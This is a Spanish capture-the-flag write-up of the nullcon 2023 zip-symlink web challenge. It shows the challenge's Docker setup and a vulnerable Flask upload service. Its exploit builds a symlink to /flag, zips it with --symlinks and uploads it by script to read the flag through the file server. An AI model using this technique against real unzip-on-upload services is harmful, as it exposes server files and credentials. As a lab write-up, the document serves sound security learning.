# Exploiting zip symlinks(nullcon CTF 2023)

# Descripción

![ZipSymlinks](Posts/CTF/2023/NullConCTF/Web/ZipSymlinks/Untitled.png)

Tenemos dos servicios web, uno para subir zips y otro para ver el contenido del zip una vez que lo hemos subido.

## Docker

### Docker-compose

```docker
version: "3.1"
services:
  zpr:
    build:
      context: .
      dockerfile: Dockerfile.app
    volumes:
      - ./code:/app
      - shared_data:/tmp/data
    ports:
      - 10015:8080
    links:
      - serve
    depends_on:
      - serve
  serve:
    build:
      context: .
      dockerfile: Dockerfile.serve
    ports:
      - 10016:8088
    volumes:
      - ./code:/app
      - ./flag:/flag:ro
      - shared_data:/tmp/data
volumes:
  shared_data:
```

Este *docker-compose* contiene dos servicios

- zpr: monta 2 volumenes, uno para importar el servicio web y otro para datos temporales
- serve: monta 3 volumenes, uno para el servicio web, otro para los datos temporales y la flag que es el archivo que tenemos que conseguir leer

## Dockerfile.app

```docker
FROM python:latest

RUN apt-get update -y && apt-get install -y unzip

WORKDIR /app
COPY ./code/requirements.txt /tmp/requirements.txt
RUN pip install -r /tmp/requirements.txt

CMD python app.py
```

### Dockerfile.serve

```docker
FROM python:latest

WORKDIR /app
COPY ./code/requirements.txt /tmp/requirements.txt
RUN pip install -r /tmp/requirements.txt

CMD python serve.py
```

## Applications

### App 1(zpr)

```python
from flask import Flask, Response, request
from werkzeug.utils import secure_filename
from subprocess import check_output
import io
import hashlib
import secrets
import zipfile
import os
import random
import glob

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 1.5 * 1000 # 1kb

@app.route('/', methods=['GET'])
def index():
	output = io.StringIO()
	output.write("Send me your zipfile as a POST request and I'll make them accessible to you ;-0.")

	return Response(output.getvalue(), mimetype='text/plain')

@app.route('/', methods=['POST'])
def upload():
	output = io.StringIO()
	if 'file' not in request.files:
		output.write("No file provided!\n")
		return Response(output.getvalue(), mimetype='text/plain')

	try:
		file = request.files['file']

		filename = hashlib.md5(secrets.token_hex(8).encode()).hexdigest()
		dirname = hashlib.md5(filename.encode()).hexdigest()

		dpath = os.path.join("/tmp/data", dirname)
		fpath = os.path.join(dpath, filename + ".zip")

		os.mkdir(dpath)
		file.save(fpath)

		with zipfile.ZipFile(fpath) as zipf:
			files = zipf.infolist()
			if len(files) > 5:
				raise Exception("Too many files!")

			total_size = 0
			for the_file in files:
				if the_file.file_size > 50:
					raise Exception("File too big.")

				total_size += the_file.file_size

			if total_size > 250:
				raise Exception("Files too big in total")

		check_output(['unzip', '-q', fpath, '-d', dpath])

		g = glob.glob(dpath + "/*")
		for f in g:
			output.write("Found a file: " + f + "\n")

		output.write("Find your files at http://...:8088/" + dirname + "/\n")

	except Exception as e:
		output.write("Error :-/\n")

	return Response(output.getvalue(), mimetype='text/plain')

if __name__ == "__main__":
	app.run(host='0.0.0.0', port='8080', debug=True)
```

Este código recibe un archivo de un usuario y lo guarda en una ubicación temporal en el servidor. Luego, verifica si el archivo es un archivo zip y si contiene menos de 5 archivos, cada uno con un tamaño menor a 50KB y si el tamaño total del total de archivos no es mayor a 250KB. Si todo esto se cumple, extrae los archivos zip en la ubicación temporal y muestra los nombres de los archivos extraídos. Si no se cumple alguna de estas condiciones, muestra un mensaje de error. Al final, devuelve una respuesta en formato de texto que contiene los nombres de los archivos extraídos y un enlace para acceder a ellos en el servidor.

### App 2(serve)

```python
from functools import partial
import http.server
import re

PORT = 8088
HOST = "0.0.0.0"

http.server.SimpleHTTPRequestHandler._orig_list_directory = http.server.SimpleHTTPRequestHandler.list_directory

def better_list_directory(self, path):
	if not re.match(r"^/tmp/data/[0-9a-f]{32}", path):
		return None
	else:
		return self._orig_list_directory(path)

http.server.SimpleHTTPRequestHandler.list_directory = better_list_directory

Handler = partial(http.server.SimpleHTTPRequestHandler, directory="/tmp/data/")
Server = http.server.ThreadingHTTPServer

with Server((HOST, PORT), Handler) as httpd:
    httpd.serve_forever()
```

Este script crea un servidor de archivos que permite a los usuarios ver y descargar archivos en línea. Lo que lo hace diferente es que solo permite a los usuarios acceder a los archivos en una ubicación específica y solo si la ruta solicitada cumple con un patrón específico de expresión regular.

## Exploiting

### PoC

Sabiendo que la flag está en **/flag** vamos a crear un enlace simbólico llamado "link" que apunta al archivo "/flag". Este enlace simbólico "link" se comporta como un acceso directo al archivo original "/flag".

```bash
┌──(kali㉿kali)-[~/Downloads/web/chall/code]
└─$ ln -s /flag link
```

<aside>
💡 "-s" indica que el enlace creado será un enlace simbólico

</aside>

Crearemos un archivo ZIP llamado "archivo.zip" que contendrá el enlace simbólico "link". 

```bash
┌──(kali㉿kali)-[~/Downloads/web/chall/code]
└─$ zip --symlinks archivo.zip link
  adding: link (stored 0%)
```

<aside>
💡 “—symlink”: es utilizado para incluir los enlaces simbólicos en el archivo ZIP

</aside>

Posteamos nuestro archivo

```python
import requests

url = 'http://52.59.124.14:10015/'
filename = 'archivo.zip'
files = {'file': (filename, open(filename, 'rb'), 'application/zip')}

response = requests.post(url, files=files)

print(response.text)
```

Y recibimos una dirección donde extraerá los archivos que hemos subido

```bash
┌──(kali㉿kali)-[~/Downloads/web/chall/code]
└─$ python3 post.py 
Found a file: /tmp/data/68bbccd22c3c487f6c4ba1b45096b72d/link
Found a file: /tmp/data/68bbccd22c3c487f6c4ba1b45096b72d/bf7f0d48f06d8be6017082b56c7c9f57.zip
Find your files at http://...:8088/68bbccd22c3c487f6c4ba1b45096b72d/
```

Una vez accedemos nos muestra los archivos que hemos subido, descargamos el archivo link, lo abrimos y podemos ver el contenido almacenado en el servidor del archivo /flag gracias a los enlaces simbólicos